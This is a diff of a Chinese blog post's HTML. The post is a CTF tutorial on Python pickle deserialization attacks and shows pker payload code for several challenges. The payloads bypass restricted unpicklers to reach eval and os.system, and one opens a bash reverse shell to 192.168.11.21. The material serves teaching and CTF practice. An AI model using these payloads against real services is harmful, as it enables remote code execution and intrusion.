 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">animal = INST(<span class="string">'__main__'</span>, <span class="string">'Animal'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>)</div><div class="line"><span class="keyword">return</span> animal</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 或者</span></div><div class="line"></div><div class="line">animal = OBJ(GLOBAL(<span class="string">'__main__'</span>, <span class="string">'Animal'</span>), <span class="string">'1'</span>,<span class="string">'2'</span>)</div><div class="line"><span class="keyword">return</span> animal</div></pre></td></tr></table></figure>
@@ -779,76 +745,60 @@ I | INTEGER | Integer | I42|<br>
 <li>也可以先实例化再赋值：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">animal = INST(<span class="string">'__main__'</span>, <span class="string">'Animal'</span>)</div><div class="line">animal.name=<span class="string">'1'</span></div><div class="line">animal.category=<span class="string">'2'</span></div><div class="line"><span class="keyword">return</span> animal</div></pre></td></tr></table></figure>
-<h4 id="手动辅助">手动辅助</h4>
-<ul>
+<h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul>
 <li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
 <li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
 </ul>
-<h3 id="pkerctf实战">pker：CTF实战</h3>
-<ul>
+<h3 id="pker：CTF实战"><a href="#pker：CTF实战" class="headerlink" title="pker：CTF实战"></a>pker：CTF实战</h3><ul>
 <li>在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。</li>
 </ul>
-<h4 id="code-breaking-picklecode">Code-Breaking: picklecode</h4>
-<p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
+<h4 id="Code-Breaking-picklecode-1"><a href="#Code-Breaking-picklecode-1" class="headerlink" title="Code-Breaking: picklecode"></a>Code-Breaking: picklecode</h4><p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">getattr=GLOBAL(<span class="string">'builtins'</span>,<span class="string">'getattr'</span>)</div><div class="line">dict=GLOBAL(<span class="string">'builtins'</span>,<span class="string">'dict'</span>)</div><div class="line">dict_get=getattr(dict,<span class="string">'get'</span>)</div><div class="line">glo_dic=GLOBAL(<span class="string">'builtins'</span>,<span class="string">'globals'</span>)()</div><div class="line">builtins=dict_get(glo_dic,<span class="string">'builtins'</span>)</div><div class="line">eval=getattr(builtins,<span class="string">'eval'</span>)</div><div class="line">eval(<span class="string">'print("123")'</span>)</div><div class="line"><span class="keyword">return</span></div></pre></td></tr></table></figure>
-<h4 id="balsnctfpyshv1">BalsnCTF:pyshv1</h4>
-<p>题目的<code>find_class</code>只允许<code>sys</code>模块，并且对象名中不能有<code>.</code>号。意图很明显，限制子模块，只允许一级模块。<br>
-<code>sys</code>模块有一个字典对象<code>modules</code>，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。<code>modules</code>中还包括了<code>sys</code>本身。我们可以利用自己包含自己这点绕过限制，具体过程为：</p>
-<ol type="1">
-<li>由于<code>sys</code>自身被包含在自身的子类里，我们可以利用这点使用<code>s</code>赋值，向后递进一级，引入<code>sys.modules</code>的子模块：<code>sys.modules['sys']=sys.modules</code>，此时就相当于<code>sys=sys.modules</code>。这样我们就可以利用原<code>sys.modules</code>下的对象了，即<code>sys.modules.xxx</code>。<br>
-</li>
-<li>首先获取<code>modules</code>的<code>get</code>函数，然后类似于上一步，再使用<code>s</code>把<code>modules</code>中的<code>sys</code>模块更新为<code>os</code>模块：<code>sys['sys']=sys.get('os')</code>。</li>
+<h4 id="BalsnCTF-pyshv1"><a href="#BalsnCTF-pyshv1" class="headerlink" title="BalsnCTF:pyshv1"></a>BalsnCTF:pyshv1</h4><p>题目的<code>find_class</code>只允许<code>sys</code>模块，并且对象名中不能有<code>.</code>号。意图很明显，限制子模块，只允许一级模块。<br><code>sys</code>模块有一个字典对象<code>modules</code>，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。<code>modules</code>中还包括了<code>sys</code>本身。我们可以利用自己包含自己这点绕过限制，具体过程为：</p>
+<ol>
+<li>由于<code>sys</code>自身被包含在自身的子类里，我们可以利用这点使用<code>s</code>赋值，向后递进一级，引入<code>sys.modules</code>的子模块：<code>sys.modules[&#39;sys&#39;]=sys.modules</code>，此时就相当于<code>sys=sys.modules</code>。这样我们就可以利用原<code>sys.modules</code>下的对象了，即<code>sys.modules.xxx</code>。  </li>
+<li>首先获取<code>modules</code>的<code>get</code>函数，然后类似于上一步，再使用<code>s</code>把<code>modules</code>中的<code>sys</code>模块更新为<code>os</code>模块：<code>sys[&#39;sys&#39;]=sys.get(&#39;os&#39;)</code>。</li>
 <li>使用<code>c</code>获取<code>system</code>，之后就可以执行系统命令了。</li>
 </ol>
 <p>整个利用过程还是很巧妙的，pker代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">modules=GLOBAL(<span class="string">'sys'</span>, <span class="string">'modules'</span>)</div><div class="line">modules[<span class="string">'sys'</span>]=modules</div><div class="line">modules_get=GLOBAL(<span class="string">'sys'</span>, <span class="string">'get'</span>)</div><div class="line">os=modules_get(<span class="string">'os'</span>)</div><div class="line">modules[<span class="string">'sys'</span>]=os</div><div class="line">system=GLOBAL(<span class="string">'sys'</span>, <span class="string">'system'</span>)</div><div class="line">system(<span class="string">'whoami'</span>)</div><div class="line"><span class="keyword">return</span></div></pre></td></tr></table></figure>
-<h4 id="balsnctfpyshv2">BalsnCTF:pyshv2</h4>
-<p>与v1类似，题目的<code>find_class</code>只允许<code>structs</code>模块，并且对象名中不能有<code>.</code>号，只允许一级模块。其中，<code>structs</code>是个空模块。但是在<code>find_class</code>中调用了<code>__import__</code>函数：</p>
+<h4 id="BalsnCTF-pyshv2"><a href="#BalsnCTF-pyshv2" class="headerlink" title="BalsnCTF:pyshv2"></a>BalsnCTF:pyshv2</h4><p>与v1类似，题目的<code>find_class</code>只允许<code>structs</code>模块，并且对象名中不能有<code>.</code>号，只允许一级模块。其中，<code>structs</code>是个空模块。但是在<code>find_class</code>中调用了<code>__import__</code>函数：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></div><div class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</div><div class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</div><div class="line">        module = __import__(module) <span class="comment"># 注意这里调用了__import__</span></div><div class="line">        <span class="keyword">return</span> getattr(module, name)</div></pre></td></tr></table></figure>
 <p>注意python的以下几条性质：</p>
-<ol type="1">
+<ol>
 <li><code>__builtins__</code>是所有模块公有的字典，记录所有内建函数，可以通过对<code>__builtins__</code>内相应key对应函数的修改劫持相应的函数。由于题目调用了<code>__import__</code>函数，我们可以通过修改<code>__import__</code>劫持<code>getattr</code>函数。</li>
 <li><code>__dict__</code>列表储存并决定了一个对象的所有属性，如果其内容被改变，属性也会改变。</li>
 <li><code>c</code>的实现过程调用了<code>find_class</code>函数（顺带一提，它实际上是先<code>import</code>再调用<code>find_class</code>，但是由于python的import语句其实是使用了五个参数调用的<code>__import</code>，无法利用），而本题的<code>find_class</code>中多调用了一次<code>__imoprt__</code>，随后调用<code>getattr</code>，这包含了一个查值的过程，这一点很重要。</li>
 </ol>
 <p>然后我们理一下利用过程：</p>
-<ol type="1">
-<li>目标：<code>structs.__builtins__['eval']</code>→需要<code>structs.__builtins__.get</code>函数。</li>
+<ol>
+<li>目标：<code>structs.__builtins__[&#39;eval&#39;]</code>→需要<code>structs.__builtins__.get</code>函数。</li>
 <li>实现二级跳转：劫持<code>__import__</code>为<code>structs.__getattribute__</code>，opcode<code>cstructs</code>变为<code>structs.__getattribute__(structs).xxx</code>。</li>
 <li>结合1、2：<code>structs.__getattribute__(structs)</code>要返回<code>structs.__builtins__</code>；xxx则设置为get。</li>
 <li>利用<code>structs.__dict__</code>对<code>structs</code>赋值新属性<code>structs.structs</code>为<code>structs.__builtins__</code>，以便<code>structs.__getattribute__(structs)</code>返回<code>structs.__builtins__</code>。</li>
 </ol>
 <p>pker实现：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">__dict__ = GLOBAL(<span class="string">'structs'</span>, <span class="string">'__dict__'</span>) <span class="comment"># structs的属性dict</span></div><div class="line">__builtins__ = GLOBAL(<span class="string">'structs'</span>, <span class="string">'__builtins__'</span>) <span class="comment"># 内建函数dict</span></div><div class="line">gtat = GLOBAL(<span class="string">'structs'</span>, <span class="string">'__getattribute__'</span>) <span class="comment"># 获取structs.__getattribute__</span></div><div class="line">__builtins__[<span class="string">'__import__'</span>] = gtat <span class="comment"># 劫持__import__函数</span></div><div class="line">__dict__[<span class="string">'structs'</span>] = __builtins__ <span class="comment"># 把structs.structs属性赋值为__builtins__</span></div><div class="line">builtin_get = GLOBAL(<span class="string">'structs'</span>, <span class="string">'get'</span>) <span class="comment"># structs.__getattribute__('structs').get</span></div><div class="line">eval = builtin_get(<span class="string">'eval'</span>) <span class="comment"># structs.structs['eval']（即__builtins__['eval']</span></div><div class="line">eval(<span class="string">'print(123)'</span>)</div><div class="line"><span class="keyword">return</span></div></pre></td></tr></table></figure>
-<h4 id="balsnctfpyshv3">BalsnCTF:pyshv3</h4>
-<p>v3的<code>find_class</code>与v1类似，并限制了<code>structs</code>模块，与v1和v2不同的是，v3的flag是由程序读取的，不用达到RCE权限。关键代码为：</p>
+<h4 id="BalsnCTF-pyshv3"><a href="#BalsnCTF-pyshv3" class="headerlink" title="BalsnCTF:pyshv3"></a>BalsnCTF:pyshv3</h4><p>v3的<code>find_class</code>与v1类似，并限制了<code>structs</code>模块，与v1和v2不同的是，v3的flag是由程序读取的，不用达到RCE权限。关键代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.key = os.urandom(<span class="number">100</span>)</div><div class="line">        self.login()</div><div class="line">        self.cmds = &#123;</div><div class="line">            <span class="string">'help'</span>: self.cmd_help,</div><div class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</div><div class="line">            <span class="string">'su'</span>: self.cmd_su,</div><div class="line">            <span class="string">'flag'</span>: self.cmd_flag,</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">            flag = f.read()</div><div class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</div><div class="line">        user = input().encode(<span class="string">'ascii'</span>)</div><div class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</div><div class="line">        user = pickle.loads(user)</div><div class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</div><div class="line">        user.privileged = <span class="keyword">False</span></div><div class="line">        user.flag = flag</div><div class="line">        self.user = user</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            req = input(<span class="string">'$ '</span>)</div><div class="line">            func = self.cmds.get(req, <span class="keyword">None</span>)</div><div class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                func()</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</div><div class="line">            print(<span class="string">'flag: Permission denied'</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pysh = Pysh()</div><div class="line">    pysh.run()</div></pre></td></tr></table></figure>
-<p>程序先进行一次pickle反序列化，<code>self.user.privileged</code>被设置为<code>False</code>，然后进入命令执行循环流程，而且提供<code>cmd_flag</code>函数，如果<code>self.user.privileged</code>为<code>True</code>，就会返回flag。<br>
-当类实现了<code>__get__</code>、<code>__set__</code>和<code>__delete__</code>任一方法时，该类被称为“描述器”类，该类的实例化为描述器。对于一个某属性为描述器的类来说，其实例化的对象在查找该属性或设置属性时将不再通过<code>__dict__</code>，而是调用该属性描述器的<code>__get__</code>、<code>__set__</code>或<code>__delete__</code>方法。需要注意的是，一个类必须在声明时就设置属性为描述器，使之成为类属性，而不是对象属性，此时描述器才能起作用。<br>
-所以，如果我们设置<code>User</code>类的<code>__set__</code>函数，它就成为了描述器；再将它设置为<code>User</code>类本身的<code>privileged</code>属性时，该属性在赋值时就会调用<code>__set__</code>函数而不会被赋值，从而绕过赋值获得flag。<br>
-pker代码为：</p>
+<p>程序先进行一次pickle反序列化，<code>self.user.privileged</code>被设置为<code>False</code>，然后进入命令执行循环流程，而且提供<code>cmd_flag</code>函数，如果<code>self.user.privileged</code>为<code>True</code>，就会返回flag。<br>当类实现了<code>__get__</code>、<code>__set__</code>和<code>__delete__</code>任一方法时，该类被称为“描述器”类，该类的实例化为描述器。对于一个某属性为描述器的类来说，其实例化的对象在查找该属性或设置属性时将不再通过<code>__dict__</code>，而是调用该属性描述器的<code>__get__</code>、<code>__set__</code>或<code>__delete__</code>方法。需要注意的是，一个类必须在声明时就设置属性为描述器，使之成为类属性，而不是对象属性，此时描述器才能起作用。<br>所以，如果我们设置<code>User</code>类的<code>__set__</code>函数，它就成为了描述器；再将它设置为<code>User</code>类本身的<code>privileged</code>属性时，该属性在赋值时就会调用<code>__set__</code>函数而不会被赋值，从而绕过赋值获得flag。<br>pker代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">User=GLOBAL(<span class="string">'structs'</span>,<span class="string">'User'</span>)</div><div class="line">User.__set__=GLOBAL(<span class="string">'structs'</span>,<span class="string">'User'</span>) <span class="comment"># 使User成为描述器类</span></div><div class="line">des=User(<span class="string">'des'</span>,<span class="string">'des'</span>) <span class="comment"># 描述器</span></div><div class="line">User.privileged=des <span class="comment"># 注意此处必须设置描述器为类的属性，而不是实例的属性</span></div><div class="line">user=User(<span class="string">'hachp1'</span>,<span class="string">'hachp1'</span>) <span class="comment"># 实例化一个User对象</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> user</div></pre></td></tr></table></figure>
-<h4 id="watevrctf-2019-pickle-store">watevrCTF-2019: Pickle Store</h4>
-<p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
+<h4 id="watevrCTF-2019-Pickle-Store-1"><a href="#watevrCTF-2019-Pickle-Store-1" class="headerlink" title="watevrCTF-2019: Pickle Store"></a>watevrCTF-2019: Pickle Store</h4><p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">system=GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>)</div><div class="line">system(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1"'</span>)</div><div class="line"><span class="keyword">return</span></div></pre></td></tr></table></figure>
-<h4 id="suctf-2019guess_game">SUCTF-2019:guess_game</h4>
-<p>题目是一个猜数字游戏，每次对输入的数据反序列化作为ticket，并与随机生成的ticket进行对比，猜对10次就给flag。<code>find_class</code>函数限制了<code>guess_game</code>模块并禁止了下划线（魔术方法、变量）：</p>
+<h4 id="SUCTF-2019-guess-game"><a href="#SUCTF-2019-guess-game" class="headerlink" title="SUCTF-2019:guess_game"></a>SUCTF-2019:guess_game</h4><p>题目是一个猜数字游戏，每次对输入的数据反序列化作为ticket，并与随机生成的ticket进行对比，猜对10次就给flag。<code>find_class</code>函数限制了<code>guess_game</code>模块并禁止了下划线（魔术方法、变量）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></div><div class="line">        <span class="comment"># Only allow safe classes</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"guess_game"</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">"__"</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</div><div class="line">            <span class="keyword">return</span> getattr(sys.modules[module], name)</div><div class="line">        <span class="comment"># Forbid everything else.</span></div><div class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</div></pre></td></tr></table></figure>
 <p>直接作弊用pickle改<code>game.ticket</code>为猜测的ticket，然后把<code>win_count</code>和<code>round_count</code>都改为9（因为还要进行一轮，<code>round_count</code>必须大于10才会出现输赢判断，而给flag的依据是<code>win_count</code>等于10轮），pickle伪代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ticket=INST(<span class="string">'guess_game.Ticket'</span>,<span class="string">'Ticket'</span>,(<span class="number">1</span>))</div><div class="line">game=GLOBAL(<span class="string">'guess_game'</span>,<span class="string">'game'</span>)</div><div class="line">game.win_count=<span class="number">9</span></div><div class="line">game.round_count=<span class="number">9</span></div><div class="line">game.curr_ticket=ticket</div><div class="line"></div><div class="line"><span class="keyword">return</span> ticket</div></pre></td></tr></table></figure>
-<h4 id="高校战疫网络安全分享赛-webtmp">高校战疫网络安全分享赛: webtmp</h4>
-<p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
+<h4 id="高校战疫网络安全分享赛-webtmp-1"><a href="#高校战疫网络安全分享赛-webtmp-1" class="headerlink" title="高校战疫网络安全分享赛: webtmp"></a>高校战疫网络安全分享赛: webtmp</h4><p>解析思路见前文手写opcode的CTF实战部分，pker代码为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">secret=GLOBAL(<span class="string">'__main__'</span>, <span class="string">'secret'</span>) <span class="comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span></div><div class="line">secret.name=<span class="string">'1'</span></div><div class="line">secret.category=<span class="string">'2'</span></div><div class="line">animal = INST(<span class="string">'__main__'</span>, <span class="string">'Animal'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>)</div><div class="line"><span class="keyword">return</span> animal</div></pre></td></tr></table></figure>
-<h2 id="后记">后记</h2>
-<ul>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
 <li>为了解决pickle反序列化的问题，官方给出了使用改写 <code>Unpickler.find_class()</code> 方法，引入白名单的方式来解决，并且给出警告：对于允许反序列化的对象必须要保持警惕。对于开发者而言，如果实在要给用户反序列化的权限，最好使用双白名单限制<code>module</code>和<code>name</code>并充分考虑到白名单中的各模块和各函数是否有危险。</li>
 <li>CTF中，pickle相关的题目一般考察对python本身（如对魔术方法和属性等）的深度理解，利用过程可以很巧妙。</li>
 <li>由于pickle“只能赋值，不能查值”的特性，唯一能够根据键值查询的操作就是<code>find_class</code>函数，即<code>c</code>、<code>i</code>等opcode，如何根据特有的魔术方法、属性等找到突破口是关键；此外，在利用过程中，往往会借助<code>getattr</code>、<code>get</code>等函数。</li>
 <li>借助pker可以比较方便的编写pickle的opcode，该工具是做题利器。</li>
-<li>本文涉及的CTF题目已整理至github：<a href="https://github.com/HACHp1/pickle_ctf_collection" class="uri" target="_blank" rel="external">https://github.com/HACHp1/pickle_ctf_collection</a></li>
+<li>本文涉及的CTF题目已整理至github：<a href="https://github.com/HACHp1/pickle_ctf_collection" target="_blank" rel="external">https://github.com/HACHp1/pickle_ctf_collection</a></li>
 </ul>
-<h2 id="参考资料">参考资料</h2>
-<ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a href="https://docs.python.org/zh-cn/3/library/pickle.html" target="_blank" rel="external">官方文档：pickle — Python 对象序列化</a></li>
 <li><a href="https://rushter.com/blog/pickle-serialization-internals/" target="_blank" rel="external">How pickle works in Python</a></li>
 <li><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="external">blackhat-Sour Pickle: A serialised exploitation guide in one part</a></li>
@@ -1156,7 +1106,7 @@ pker代码为：</p>
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2022 HACHp1<br>
+            &copy; 2023 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
